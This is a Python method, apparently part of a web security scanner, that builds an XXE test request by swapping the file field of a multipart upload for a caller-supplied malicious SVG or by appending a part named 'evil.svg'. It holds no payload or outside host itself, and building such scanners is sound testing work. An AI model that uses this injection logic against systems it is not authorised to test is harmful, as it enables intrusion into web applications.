    def _xxe_build_svg_multipart(
        self, original_body: str, original_ct: str, svg_content: str
    ) -> Tuple[Optional[str], str]:
        """
        Replace the file field in a multipart body with a malicious SVG.
        Returns (new_body, new_content_type) or (None, '') on failure.
        """
        try:
            bm = re.search(r"boundary=([^\s;\"']+)", original_ct or "")
            if not bm:
                return None, ""
            boundary = bm.group(1).strip()

            # Try to replace an existing file part
            new_body = re.sub(
                r'(Content-Disposition: form-data;[^\n]*filename="[^"]*"[^\n]*)\r?\n'
                r'(Content-Type: )[^\n]+\r?\n\r?\n[^\-]*',
                lambda mo: (
                    mo.group(1).rstrip() + "\r\n"
                    + mo.group(2) + "image/svg+xml\r\n\r\n"
                    + svg_content + "\r\n"
                ),
                original_body,
                count=1,
                flags=re.DOTALL,
            )
            if new_body == original_body:
                # Inject as a new file part before the closing boundary
                new_body = original_body.rstrip()
                if new_body.endswith(f"--{boundary}--"):
                    new_body = new_body[: -len(f"--{boundary}--")]
                new_body += (
                    f"\r\n--{boundary}\r\n"
                    'Content-Disposition: form-data; name="avatar"; filename="evil.svg"\r\n'
                    "Content-Type: image/svg+xml\r\n\r\n"
                    f"{svg_content}\r\n"
                    f"--{boundary}--\r\n"
                )

            return new_body, f"multipart/form-data; boundary={boundary}"
        except Exception as exc:
            logger.debug("SVG multipart build error: %s", exc)
            return None, ""